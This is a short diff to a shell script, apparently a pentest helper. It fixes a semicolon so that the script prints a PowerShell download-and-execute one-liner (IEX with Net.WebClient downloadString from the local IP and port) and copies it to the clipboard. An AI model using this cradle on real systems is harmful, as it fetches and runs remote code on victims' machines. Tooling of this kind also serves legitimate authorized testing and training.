@@ -6,4 +6,4 @@ fi
 IP=$( IP_No_Clip );                      
 New_IP=$( echo -n $IP );                                                                                                              
 echo "powershell.exe \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\"";
-echo "powershell.exe \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\""; | clip
+echo "powershell.exe \"IEX(New-Object Net.WebClient).downloadString('http://$IP:$1/$2')\"" | clip;
